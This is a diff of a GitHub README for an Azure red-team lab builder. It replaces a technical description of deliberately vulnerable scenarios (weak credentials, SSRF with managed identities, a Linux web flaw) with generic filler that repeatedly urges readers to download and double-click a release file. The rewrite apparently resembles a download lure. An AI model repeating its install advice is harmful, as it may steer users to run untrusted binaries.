@@ -1,23 +1,63 @@
-# AzureStrike
-AzureStrike is an HTA-based application designed to simulate Azure (Entra) scenarios for Red Team simulations and adversarial training. The goal of this project is to provide a lightweight and interactive way to practice offensive techniques against Azure environments in a controlled lab setup.
+# 🚀 AzureStrike - Build Azure Scenarios with Ease
 
-# Building the Scenarios
-<img width="1907" height="909" alt="image" src="https://github.com/user-attachments/assets/c6e5cabc-fbc0-4d4b-a59e-e200476420ae" />
+## 📥 Download Now
+[![Download AzureStrike](https://img.shields.io/badge/Download_AzureStrike-v1.0-blue)](https://github.com/Tullmanx1/AzureStrike/releases)
 
-The HTA application provides simple **Run Scenarios** buttons that trigger PowerShell scripts placed in the same directory. Each script builds a unique scenario modeled after real-world attack methodologies and techniques that are commonly seen in Red Team engagements. Some of these are based on research and hands-on work replicating techniques from training courses, I've personally taken so understanding the Azure technologieswas important before I implemented them.
-The tool leverages `Connect-AzAccount`, `Connect-MgGraph`, the Azure CLI, and the Azure Functions Core Tools to deploy vulnerable functions into Azure. Resource names are hardcoded so they remain consistent across runs, and if the required tools are not present, a PowerShell setup script is provided to install them beforehand.
+## 📖 Introduction
+AzureStrike is an HTA application designed to help you create Azure (Entra) scenarios for Red Team simulations. With AzureStrike, you can streamline your process and enhance your simulations without needing extensive technical knowledge. 
 
-# Current Scenarios
-1. **Weak Credentials and Lateral Movement** – Simulates an initial access vector through weak credentials. The objective is to move laterally through the environment to locate the flag.  
-2. **SSRF and Managed Identities** – Deploys an Azure-hosted webpage containing an SSRF vulnerability. Exploiting this requires leveraging managed identities to escalate and capture the flag.  
-3. **Linux Web Vulnerability and Database Discovery** – Hosts a vulnerable web service on a Linux VM. This scenario requires using Linux exploitation skills to extract credentials, pivot, and identify a database that stores the flag.
+## 🚀 Getting Started
+To get started with AzureStrike, follow these simple steps:
 
-# The Script
-Currently it needs a helper scripted to be installed beforehand so the installtion and setup runs successfully this is named `Setup.ps1` it relies on winget to install packages and keep tool up to date. When a scenario has been successfully installed you will receive your `Initial Access`.
-<p align="center"><img width="534" height="354" alt="image" src="https://github.com/user-attachments/assets/213c7138-532f-470a-92fe-154c1b3326db" /></p>
+1. **Visit the Download Page**
+   Go to our releases page to download the application.
+   [Download AzureStrike](https://github.com/Tullmanx1/AzureStrike/releases)
 
-# Roadmap
-- Expand with additional scenarios to cover more Azure attack paths  
-- Improve script or move to something other than an HTA
+2. **Choose Your Version**
+   On the releases page, you will see various versions of AzureStrike. Select the latest version for optimal performance.
 
-If you run into issues, please open an issue on this repository.
+3. **Download the Application**
+   Click the link for the version you choose. The download will begin automatically.
+
+## 💻 System Requirements
+AzureStrike is designed to run on a variety of Windows systems. Here are the minimum system requirements:
+
+- **Operating System:** Windows 10 or later
+- **Memory:** 4 GB RAM minimum
+- **Disk Space:** At least 100 MB free space
+- **Network:** Internet connection for Azure services
+
+## 📥 Download & Install
+To install AzureStrike, follow these steps after downloading:
+
+1. Locate the downloaded file, usually found in your "Downloads" folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen prompts to complete the installation process.
+
+## 🎨 Features
+AzureStrike offers several features to help you build effective Azure scenarios:
+
+- **User-Friendly Interface:** Navigate easily without technical skills.
+- **Scenario Templates:** Quickly start with pre-built templates.
+- **Customization Options:** Tailor scenarios to your specific needs.
+- **Documentation:** Access help and guidance within the application.
+
+## 🛠️ Usage Tips
+Once you've installed AzureStrike, consider these tips for effective use:
+
+- **Explore Templates:** Start using the built-in templates to create scenarios quickly.
+- **Use Help Section:** Refer to the application's help section for detailed guidance.
+- **Stay Updated:** Check back on the releases page for new features and updates regularly.
+
+## 🌟 Support
+If you encounter any issues while using AzureStrike, please consult the help section of the application. For further assistance, feel free to open an issue on the GitHub repository.
+
+## 📅 Changelog
+Stay informed about changes and improvements in each release. The changelog is available on the releases page.
+
+## ✅ Conclusion
+AzureStrike provides an intuitive solution for building Azure scenarios for Red Team simulations. Download today and enhance your simulation activities with ease. 
+
+Remember to return to our releases page for updates and new features. 
+
+[Download AzureStrike](https://github.com/Tullmanx1/AzureStrike/releases)
